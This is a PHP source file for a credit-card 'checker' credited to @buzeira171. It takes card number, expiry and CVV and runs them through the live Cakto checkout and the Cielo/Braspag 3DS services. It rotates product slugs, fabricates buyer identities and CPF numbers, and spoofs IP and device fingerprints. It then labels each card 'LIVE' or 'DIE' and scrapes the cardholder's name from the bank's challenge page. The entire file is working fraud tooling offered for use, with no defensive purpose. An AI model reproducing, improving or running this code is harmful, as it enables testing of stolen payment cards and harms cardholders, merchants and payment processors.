<?php
// ========== CAKTO CHECKER @buzeira171 - FLUXO COMPLETO v2.2 (SLUG ROTATIVO) ==========
// Uso: http://localhost/cakto1.php?lista=5122672305123117|04|2028|458

// ========== CONFIGURAÇÕES ==========
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

// ========== 🔥 SLUGS PARA ROTAÇÃO @buzeira171 ==========
$slugs = [
    '6j7gqm7_1052567',
	'srbzmcd_346254',
	'y7stkb2_448491_Hsn4tdpm',
	'fSrCqGN_TnERTtbo',
    'wbxwi7i_441845',
	'jjm2sbd_981085',
    'ew45b4v_4ZBMYq85'
];

// ========== ARQUIVO PARA CONTROLAR O SLUG ATUAL @buzeira171 ==========
$slugControlFile = __DIR__ . '/slug_control.txt';

// ========== URLS BASE ==========
define('BASE_URL', 'https://pay.cakto.com.br');
define('API_BASE', 'https://api.cakto.com.br');
define('CIELO_TOKEN_URL', API_BASE . '/api/financial/cielo/3ds/token/');
define('BRASPAG_INIT_URL', 'https://mpi.braspag.com.br/v2/3ds/init');
define('BRASPAG_ENROLL_URL', 'https://mpi.braspag.com.br/v2/3ds/enroll');

// ========== DEBUG ==========
define('DEBUG_ENABLED', true);
$debugFile = __DIR__ . '/debug_cakto_' . date('Y-m-d') . '.txt';

function debugLog($msg, $data = null) {
    global $debugFile;
    $timestamp = date('Y-m-d H:i:s');
    $log = "[{$timestamp}] {$msg}\n";
    if ($data !== null) {
        $log .= "DATA: " . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    }
    $log .= str_repeat('-', 80) . "\n";
    file_put_contents($debugFile, $log, FILE_APPEND | LOCK_EX);
}

// ========== FUNÇÃO PARA PEGAR PRÓXIMO SLUG (ROTATIVO) @buzeira171 ==========
function getNextSlug($slugs) {
    global $slugControlFile;
    
    // Lê o índice atual
    $currentIndex = 0;
    if (file_exists($slugControlFile)) {
        $currentIndex = (int)file_get_contents($slugControlFile);
    }
    
    // Pega o slug atual
    $slug = $slugs[$currentIndex] ?? $slugs[0];
    
    // Atualiza para o próximo índice (round-robin)
    $nextIndex = ($currentIndex + 1) % count($slugs);
    file_put_contents($slugControlFile, $nextIndex);
    
    debugLog("🔄 SLUG ROTATIVO", [
        'slug_usado' => $slug,
        'indice_anterior' => $currentIndex,
        'proximo_indice' => $nextIndex,
        'total_slugs' => count($slugs)
    ]);
    
    return $slug;
}

// ========== FUNÇÕES AUXILIARES @buzeira171 ==========
function detectarBandeira($cc) {
    if (preg_match('/^4/', $cc)) return 'VISA';
    if (preg_match('/^5[1-5]/', $cc)) return 'MASTER';
    if (preg_match('/^3[47]/', $cc)) return 'AMEX';
    if (preg_match('/^6/', $cc)) return 'ELO';
    if (preg_match('/^2/', $cc)) return 'MASTER';
    return 'DESCONHECIDA';
}

function gerarUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff),
        mt_rand(0,0x0fff)|0x4000, mt_rand(0,0x3fff)|0x8000,
        mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff));
}

function gerarSessionId() {
    return substr(md5(time() . rand()), 0, 20);
}

function gerarDeviceId($cc) {
    return "armor." . md5($cc . time() . rand()) . ".ad0ee09f94fc1e474ff9e3ce2df77fb0";
}

function getCookieString($jar) {
    $s = '';
    foreach ($jar as $k => $v) $s .= "$k=$v; ";
    return $s;
}

function mergeCookies(&$jar, $newCookies) {
    foreach ($newCookies as $k => $v) $jar[$k] = $v;
}

function parseCartao($lista) {
    $lista = trim($lista);
    $separar = explode("|", $lista);
    if (count($separar) < 4) return null;
    
    $numero = trim($separar[0]);
    $mes = str_pad(trim($separar[1]), 2, '0', STR_PAD_LEFT);
    $ano = trim($separar[2]);
    $cvv = trim($separar[3]);
    
    if (strlen($ano) == 2) $ano = "20" . $ano;
    
    return [
        'numero' => preg_replace('/\s+/', '', $numero),
        'mes' => $mes,
        'ano' => $ano,
        'cvv' => $cvv,
        'completo' => $numero . "|" . $mes . "|" . $ano . "|" . $cvv
    ];
}

// ========== FUNÇÃO HTTP @buzeira171 ==========
function httpRequest($method, $url, $headers = [], $body = null, $timeout = 30) {
    $ch = curl_init();
    
    $curlOpts = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_HEADER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_VERBOSE => false
    ];
    
    if ($method === 'POST') {
        $curlOpts[CURLOPT_POST] = true;
        if ($body) $curlOpts[CURLOPT_POSTFIELDS] = $body;
    }
    
    if (!empty($headers)) {
        $curlOpts[CURLOPT_HTTPHEADER] = $headers;
    }
    
    curl_setopt_array($ch, $curlOpts);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $curlError = curl_error($ch);
    $curlErrno = curl_errno($ch);
    
    curl_close($ch);
    
    $headers_raw = $response ? substr($response, 0, $headerSize) : '';
    $body = $response ? substr($response, $headerSize) : '';
    
    $cookies = [];
    if ($headers_raw) {
        preg_match_all('/^[Ss]et-[Cc]ookie:\s*([^=]+)=([^;]+)/m', $headers_raw, $matches);
        foreach ($matches[1] as $i => $name) {
            $cookies[trim($name)] = trim($matches[2][$i]);
        }
    }
    
    return [
        'success' => empty($curlError) && $httpCode < 400,
        'http_code' => $httpCode,
        'body' => $body,
        'cookies' => $cookies,
        'curl_error' => $curlError,
        'curl_errno' => $curlErrno,
        'headers' => $headers_raw
    ];
}

function extrairCookiesDaResposta($response) {
    return $response['cookies'] ?? [];
}

// ========== FUNÇÃO PARA GERAR DADOS FICTÍCIOS @buzeira171 ==========
function gerarDadosPessoais() {
    $nomes = [
        'ALYSON HENRIQUE GOUVEIA MELO DE OLIVEIRA',
        'JOSE CARLOS DA SILVA',
        'MARIA APARECIDA SANTOS',
        'THALISSON RODRIGUES',
        'ANA BEATRIZ COSTA',
        'PEDRO HENRIQUE MARTINS',
        'FERNANDA LIMA SOUZA',
        'ROBERTO CARLOS ALMEIDA'
    ];
    $sobrenomes = ['Novaes', 'Santos', 'Silva', 'Oliveira', 'Pereira', 'Costa', 'Rodrigues', 'Almeida'];
    
    $nomeCompleto = $nomes[array_rand($nomes)];
    $primeiroNome = explode(' ', $nomeCompleto)[0];
    
    $cpf = '';
    for ($i = 0; $i < 11; $i++) $cpf .= rand(0, 9);
    
    $telefone = '11' . rand(90000, 99999) . rand(1000, 9999);
    $email = strtolower($primeiroNome) . '_' . $sobrenomes[array_rand($sobrenomes)] . rand(10, 999) . '@gmail.com';
    
    return [
        'nome_completo' => $nomeCompleto,
        'cpf_sem_pontos' => $cpf,
        'telefone' => $telefone,
        'email' => $email
    ];
}

// ========== FUNÇÃO PARA FORMATAR SAÍDA @buzeira171 ==========
function formatarSaidaDie($cartaoCompleto, $bandeira, $slug, $motivo, $tempo, $detalhes = '') {
    return "❌ DIE ~> {$cartaoCompleto} ~> {$bandeira} ~> {$motivo} ~> {$tempo}s" . ($detalhes ? " ~~> {$detalhes} ~~> @buzeira171" : "");
}

function formatarSaidaLive($cartaoCompleto, $bandeira, $slug, $motivo, $tempo, $detalhes = '', $tgTag = '') {
    return "✅ LIVE (3DS) ~> {$cartaoCompleto} ~> {$bandeira}~> {$motivo} ~> {$tempo}s ~~> {$detalhes} {$tgTag} ~~> @buzeira171";
}

// ========== FUNÇÃO PARA TESTAR UM SLUG @buzeira171 ==========
function testarSlug($slug, $cartao, $bandeira, $inicio) {
    global $debugFile;
    
    $checkoutSlug = $slug;
    $checkoutUrl = BASE_URL . "/{$checkoutSlug}";
    $checkoutUrlEncoded = urlencode($checkoutUrl);
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36';
    
    $cookieJar = [];
    
    debugLog("========================================");
    debugLog("🚀 TESTANDO SLUG: " . $slug, [
        'cartao' => substr($cartao['numero'], 0, 6) . '******' . substr($cartao['numero'], -4),
        'bandeira' => $bandeira,
        'url' => $checkoutUrl
    ]);
    
    // ========== STEP 1: GET Checkout @buzeira171 ==========
    debugLog("📌 STEP 1: Acessando checkout...");
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language: pt-BR,pt;q=0.9,en;q=0.8',
        'user-agent: ' . $userAgent
    ];
    
    $response = httpRequest('GET', $checkoutUrl, $headers, null, 30);
    
    if (!$response['success'] || $response['http_code'] != 200) {
        debugLog("❌ STEP 1: Falha no checkout para slug " . $slug);
        return ['success' => false, 'error' => 'Falha no checkout', 'slug' => $slug];
    }
    
    mergeCookies($cookieJar, extrairCookiesDaResposta($response));
    debugLog("✅ STEP 1: Checkout OK");
    
    // ========== STEP 2: Product Info @buzeira171 ==========
    debugLog("📌 STEP 2: Buscando produto...");
    sleep(1);
    
    $cookieString = getCookieString($cookieJar);
    $urlProduct = API_BASE . "/api/product/checkout/{$checkoutSlug}/?checkoutUrl={$checkoutUrlEncoded}";
    
    $headers = [
        'accept: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'cookie: ' . $cookieString
    ];
    
    $response = httpRequest('GET', $urlProduct, $headers, null, 30);
    
    if (!$response['success'] || $response['http_code'] != 200) {
        debugLog("❌ STEP 2: Falha ao obter produto para slug " . $slug);
        return ['success' => false, 'error' => 'Falha ao obter produto', 'slug' => $slug];
    }
    
    $dataProduct = json_decode($response['body'], true);
    $productShortId = $dataProduct['product']['short_id'] ?? null;
    $productPrice = $dataProduct['product']['price'] ?? null;
    
    if (!$productShortId || !$productPrice) {
        debugLog("❌ STEP 2: Produto não encontrado para slug " . $slug);
        return ['success' => false, 'error' => 'Produto não encontrado', 'slug' => $slug];
    }
    
    debugLog("✅ STEP 2: Produto OK", ['short_id' => $productShortId, 'price' => $productPrice]);
    mergeCookies($cookieJar, extrairCookiesDaResposta($response));
    
    // ========== STEP 3: Installments @buzeira171 ==========
    debugLog("📌 STEP 3: Buscando parcelas...");
    sleep(1);
    
    $urlInstallments = API_BASE . "/api/checkout/installments/{$checkoutSlug}/?total={$productPrice}";
    $headers = [
        'accept: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'cookie: ' . $cookieString
    ];
    
    $response = httpRequest('GET', $urlInstallments, $headers, null, 30);
    if ($response['success'] && $response['http_code'] == 200) {
        mergeCookies($cookieJar, extrairCookiesDaResposta($response));
    }
    debugLog("✅ STEP 3: Parcelas OK");
    
    // ========== STEP 4: Enviar dados do cliente @buzeira171 ==========
    debugLog("📌 STEP 4: Enviando dados do cliente...");
    sleep(1);
    
    $dados = gerarDadosPessoais();
    debugLog("👤 Dados gerados", ['nome' => $dados['nome_completo'], 'email' => $dados['email']]);
    
    $urlCustomer = API_BASE . "/api/product/checkout/{$checkoutSlug}/?checkoutUrl={$checkoutUrlEncoded}&email=" 
        . urlencode($dados['email']) 
        . "&phone=" . urlencode("55" . $dados['telefone']) 
        . "&name=" . urlencode($dados['nome_completo']);
    
    $headers = [
        'accept: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'cookie: ' . $cookieString
    ];
    
    $response = httpRequest('GET', $urlCustomer, $headers, null, 30);
    
    if (!$response['success'] || $response['http_code'] != 200) {
        debugLog("❌ STEP 4: Falha ao enviar dados do cliente para slug " . $slug);
        return ['success' => false, 'error' => 'Falha ao enviar dados do cliente', 'slug' => $slug];
    }
    
    debugLog("✅ STEP 4: Dados do cliente OK");
    mergeCookies($cookieJar, extrairCookiesDaResposta($response));
    
    // ========== STEP 5: Tentativa de Pagamento @buzeira171 ==========
    debugLog("📌 STEP 5: Tentativa de pagamento...");
    sleep(1);
    
    $fingerprint = (string)mt_rand(100000000, 999999999);
    $deviceId = gerarDeviceId($cartao['numero']);
    $antifraudRef = gerarUUID();
    $sessionId = gerarSessionId();
    
    $payloadPayment = [
        "customer" => [
            "docNumber" => $dados['cpf_sem_pontos'],
            "email" => $dados['email'],
            "fingerprint" => $fingerprint,
            "docType" => "cpf",
            "name" => $dados['nome_completo'],
            "phone" => "55" . $dados['telefone']
        ],
        "paymentMethod" => "credit_card",
        "items" => [
            ["id" => $checkoutSlug, "offerType" => "main", "installments" => 1]
        ],
        "metadata" => [
            "ip" => "123.123.123.84",
            "country" => "br",
            "sessionid" => $sessionId
        ],
        "type" => "product",
        "refererUrl" => "",
        "antifraud_profiling_attempt_reference" => $antifraudRef,
        "deviceId" => $deviceId,
        "card" => [
            "holderName" => $dados['nome_completo'],
            "number" => $cartao['numero'],
            "expMonth" => $cartao['mes'],
            "expYear" => $cartao['ano'],
            "cvv" => $cartao['cvv']
        ],
        "saveCard" => false,
        "checkoutUrl" => $checkoutUrl
    ];
    
    $urlPayment = API_BASE . "/api/checkout/{$productShortId}/";
    $headers = [
        'accept: application/json',
        'content-type: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'cookie: ' . $cookieString
    ];
    
    debugLog("📦 Payload Pagamento", ['payload' => $payloadPayment]);
    
    $response = httpRequest('POST', $urlPayment, $headers, json_encode($payloadPayment), 30);
    $dataPayment = json_decode($response['body'], true);
    
    debugLog("📥 Resposta Pagamento", $dataPayment);
    
    $status = $dataPayment['payments'][0]['status'] ?? $dataPayment['status'] ?? 'unknown';
    $isApproved = in_array($status, ['succeeded', 'approved', 'authorized']);
    $errorMessage = $dataPayment['payments'][0]['reason'] ?? $dataPayment['payments'][0]['return_code'] ?? $status;
    
    // 🔥 VERIFICA CÓDIGOS DE APROVAÇÃO (83, 84, 85)
    $approvalCodes = ['83', '84', '85'];
    $isApprovalByCode = false;
    foreach ($approvalCodes as $code) {
        if (strpos($errorMessage, $code) !== false) {
            $isApprovalByCode = true;
            break;
        }
    }
    
    if ($isApprovalByCode) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => true, 'status' => 'live', 'motivo' => "APROVADO (Código: {$errorMessage})", 'slug' => $slug, 'tempo' => $tempo];
    }
    
    // 🔥 VERIFICA SE PRECISA DE 3DS @buzeira171
    $needsThreeDs = false;
    $threeDsData = null;
    
    if ($status === 'refused') {
        $needsThreeDs = true;
        debugLog("🔐 Pagamento recusado - iniciando fluxo 3DS");
    }
    
    if (isset($dataPayment['payments'][0]['threeDs']) && $dataPayment['payments'][0]['threeDs'] !== null) {
        $needsThreeDs = true;
        debugLog("🔐 3DS detectado via threeDs!");
    }
    
    if (isset($dataPayment['payments'][0]['nextStep']) && $dataPayment['payments'][0]['nextStep'] === 'three_ds') {
        $needsThreeDs = true;
        debugLog("🔐 3DS detectado via nextStep!");
    }
    
    if (isset($dataPayment['payments'][0]['return_code']) && in_array($dataPayment['payments'][0]['return_code'], ['475', '476', '477', '480'])) {
        $needsThreeDs = true;
        debugLog("🔐 3DS detectado via return_code: {$dataPayment['payments'][0]['return_code']}");
    }
    
    debugLog("📊 Status: {$status}, needs_3ds: " . ($needsThreeDs ? 'SIM' : 'NÃO'));
    
    if ($isApproved) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => true, 'status' => 'live', 'motivo' => 'APROVADO DIRETO', 'slug' => $slug, 'tempo' => $tempo];
    }
    
    if (!$needsThreeDs) {
        return ['success' => false, 'status' => 'die', 'motivo' => $errorMessage ?: 'Pagamento recusado sem 3DS', 'slug' => $slug];
    }
    
    debugLog("🔐 REQUER 3DS - Continuando fluxo...");
    mergeCookies($cookieJar, extrairCookiesDaResposta($response));
    
    // ========== STEP 6: Token Cielo @buzeira171 ==========
    debugLog("📌 STEP 6: Obtendo token Cielo...");
    sleep(1);
    
    $headers = [
        'accept: */*',
        'content-type: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'cookie: ' . $cookieString
    ];
    
    $response = httpRequest('GET', CIELO_TOKEN_URL, $headers, null, 20);
    
    if (!$response['success'] || $response['http_code'] != 200) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => false, 'status' => 'die', 'motivo' => 'Falha ao obter token Cielo', 'slug' => $slug];
    }
    
    $dataToken = json_decode($response['body'], true);
    $accessToken = $dataToken['access_token'] ?? null;
    
    if (!$accessToken) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => false, 'status' => 'die', 'motivo' => 'Token Cielo não encontrado', 'slug' => $slug];
    }
    
    debugLog("✅ STEP 6: Token Cielo OK");
    mergeCookies($cookieJar, extrairCookiesDaResposta($response));
    
    // ========== STEP 7: Braspag Init @buzeira171 ==========
    debugLog("📌 STEP 7: Braspag Init...");
    sleep(1);
    
    $amount = (int)($productPrice * 100);
    $payloadInit = [
        "orderNumber" => $checkoutSlug,
        "currency" => "BRL",
        "amount" => (string)$amount
    ];
    
    $headers = [
        'accept: */*',
        'content-type: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'authorization: Bearer ' . $accessToken
    ];
    
    $response = httpRequest('POST', BRASPAG_INIT_URL, $headers, json_encode($payloadInit), 30);
    
    if (!$response['success'] || $response['http_code'] != 200) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => false, 'status' => 'die', 'motivo' => 'Falha no Braspag Init', 'slug' => $slug];
    }
    
    $dataInit = json_decode($response['body'], true);
    $referenceId = $dataInit['ReferenceId'] ?? null;
    
    if (!$referenceId) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => false, 'status' => 'die', 'motivo' => 'ReferenceId não encontrado', 'slug' => $slug];
    }
    
    debugLog("✅ STEP 7: Braspag Init OK");
    
    // ========== STEP 8: Braspag Enroll @buzeira171 ==========
    debugLog("📌 STEP 8: Braspag Enroll...");
    sleep(1);
    
    $browserInfo = [
        "userAgent" => $userAgent,
        "screenWidth" => 1920,
        "screenHeight" => 1080,
        "colorDepth" => 24,
        "timeZoneOffset" => 180,
        "language" => "pt-BR",
        "javaEnabled" => "N",
        "javascriptEnabled" => "Y"
    ];
    
    $payloadEnroll = [
        "ordernumber" => $checkoutSlug,
        "currency" => "BRL",
        "totalamount" => (string)$amount,
        "paymentmethod" => "credit",
        "cardnumber" => $cartao['numero'],
        "cardexpirationmonth" => $cartao['mes'],
        "cardexpirationyear" => $cartao['ano'],
        "browserInfo" => $browserInfo,
        "RecurringInfo" => [
            "type" => null,
            "validationIndicator" => null,
            "maximumAmount" => null,
            "referenceNumber" => null,
            "occurrence" => null,
            "numberOfPayments" => null,
            "amountType" => null
        ]
    ];
    
    $headers = [
        'accept: */*',
        'content-type: application/json',
        'origin: ' . BASE_URL,
        'referer: ' . $checkoutUrl,
        'user-agent: ' . $userAgent,
        'authorization: Bearer ' . $accessToken
    ];
    
    $response = httpRequest('POST', BRASPAG_ENROLL_URL, $headers, json_encode($payloadEnroll), 30);
    
    if (!$response['success'] || $response['http_code'] != 200) {
        $tempo = number_format(microtime(true) - $inicio, 2);
        return ['success' => false, 'status' => 'die', 'motivo' => 'Falha no Braspag Enroll', 'slug' => $slug];
    }
    
    $dataEnroll = json_decode($response['body'], true);
    debugLog("📥 Resposta Enroll", $dataEnroll);
    
    $status = $dataEnroll['Status'] ?? 'UNKNOWN';
    $acsUrl = $dataEnroll['AcsUrl'] ?? null;
    $pareq = $dataEnroll['Pareq'] ?? null;
    
    // ========== SE TEM DESAFIO (ENROLLED) ==========
    if ($status === 'ENROLLED' && $acsUrl && $pareq) {
        debugLog("🔐 DESAFIO 3DS DETECTADO!");
        
        $threeDSSessionData = "0_" . md5(uniqid() . time() . rand());
        
        $postFields = http_build_query([
            'creq' => $pareq,
            'threeDSSessionData' => $threeDSSessionData
        ]);
        
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type: application/x-www-form-urlencoded',
            'origin: ' . BASE_URL,
            'referer: ' . $checkoutUrl,
            'user-agent: ' . $userAgent
        ];
        
        $response = httpRequest('POST', $acsUrl, $headers, $postFields, 30);
        
        if ($response['success'] && $response['http_code'] == 200) {
            $html = $response['body'];
            
            $htmlFile = __DIR__ . '/HTML DEBUG/challenge_html_' . date('Y-m-d_H-i-s') . '.html';
            if (!is_dir(__DIR__ . '/HTML DEBUG')) {
                mkdir(__DIR__ . '/HTML DEBUG', 0777, true);
            }
            file_put_contents($htmlFile, $html);
            debugLog("✅ HTML do desafio salvo: " . $htmlFile);
            
            $challengeType = "OOB_APP";
            $cardHolder = "Não disponível";
            $transactionValue = "R$ " . number_format($productPrice, 2, ',', '.');
            $establishment = "Cakto";
            $challengeMessage = "Desafio 3DS detectado";
            
            if (preg_match('/([A-ZÀ-Ú\s]+),?\s*(?:dentro de instantes|para concluir)/u', $html, $nameMatch)) {
                $cardHolder = trim($nameMatch[1]);
            }
            
            if (preg_match('/<div class="challengeInfoText">\s*<p>(.*?)<\/p>\s*<\/div>/s', $html, $msgMatch)) {
                $challengeMessage = trim(preg_replace('/\s+/', ' ', strip_tags($msgMatch[1])));
            }
            
            if (strpos($html, 'Sicredi') !== false || strpos($html, 'Sicoob') !== false) {
                $challengeType = "OOB_APP";
            } elseif (strpos($html, 'Santander') !== false) {
                $challengeType = "OOB_APP";
            } elseif (strpos($html, 'SMS') !== false) {
                $challengeType = "SMS";
            }
            
            $tempo = number_format(microtime(true) - $inicio, 2);
            $detalhes = "3DS:{$challengeType} | {$transactionValue} | {$cardHolder} | {$establishment} | Msg: " . substr($challengeMessage, 0, 80);
            
            return ['success' => true, 'status' => 'live', 'motivo' => "3DS:{$challengeType}", 'slug' => $slug, 'tempo' => $tempo, 'detalhes' => $detalhes];
        } else {
            $tempo = number_format(microtime(true) - $inicio, 2);
            return ['success' => true, 'status' => 'live', 'motivo' => '3DS:CHALLENGE', 'slug' => $slug, 'tempo' => $tempo, 'detalhes' => 'Desafio detectado (sem HTML)'];
        }
    }
    
    // ========== RESULTADO FINAL @buzeira171 ==========
    $tempo = number_format(microtime(true) - $inicio, 2);
    $transStatus = $dataEnroll['Authentication']['ParesStatus'] ?? $dataEnroll['Status'] ?? 'U';
    
    if ($transStatus === 'Y' || $transStatus === 'AUTHENTICATED') {
        return ['success' => true, 'status' => 'live', 'motivo' => '3DS:Y', 'slug' => $slug, 'tempo' => $tempo, 'detalhes' => 'Autenticado com sucesso'];
    } elseif ($transStatus === 'R' || $transStatus === 'FAILED') {
        return ['success' => false, 'status' => 'die', 'motivo' => '3DS:R (Recusado)', 'slug' => $slug];
    } else {
        return ['success' => false, 'status' => 'die', 'motivo' => "3DS:{$transStatus}", 'slug' => $slug];
    }
}

// ========== MAIN ==========
$lista = $_GET['lista'] ?? '';

if (empty($lista)) {
    $lista = $_POST['cards'] ?? $_POST['lista'] ?? $_GET['cards'] ?? '';
}

if (empty($lista)) {
    $input = file_get_contents('php://input');
    if (!empty($input)) {
        $data = json_decode($input, true);
        $lista = $data['lista'] ?? $data['cards'] ?? '';
    }
}

if (empty($lista)) {
    echo "❌ ERRO | Nenhum cartão recebido!";
    exit;
}

$inicio = microtime(true);
$cartao = parseCartao($lista);

if (!$cartao) {
    die(formatarSaidaDie($lista, 'DESCONHECIDA', 'N/A', 'Formato inválido', '0'));
}

$bandeira = detectarBandeira($cartao['numero']);

// ========== 🔥 PEGA O PRÓXIMO SLUG (ROTATIVO) @buzeira171 ==========
$slug = getNextSlug($GLOBALS['slugs']);

debugLog("========================================");
debugLog("🚀 INICIANDO VALIDAÇÃO COM SLUG ROTATIVO", [
    'cartao' => substr($cartao['numero'], 0, 6) . '******' . substr($cartao['numero'], -4),
    'bandeira' => $bandeira,
    'slug_usado' => $slug,
    'todos_slugs' => $GLOBALS['slugs']
]);

// ========== TESTAR APENAS O SLUG SELECIONADO @buzeira171 ==========
$resultado = testarSlug($slug, $cartao, $bandeira, $inicio);

if ($resultado['success'] && $resultado['status'] === 'live') {
    $tempo = number_format(microtime(true) - $inicio, 2);
    $detalhes = $resultado['detalhes'] ?? '';
    $motivo = $resultado['motivo'] ?? 'APROVADO';
    
    die(formatarSaidaLive(
        $cartao['completo'], 
        $bandeira, 
        $resultado['slug'], 
        $motivo, 
        $tempo, 
        $detalhes, 
        '📱'
    ));
} else {
    $tempo = number_format(microtime(true) - $inicio, 2);
    $motivo = $resultado['motivo'] ?? 'Falha desconhecida';
    die(formatarSaidaDie($cartao['completo'], $bandeira, $slug, $motivo, $tempo));
}

?>
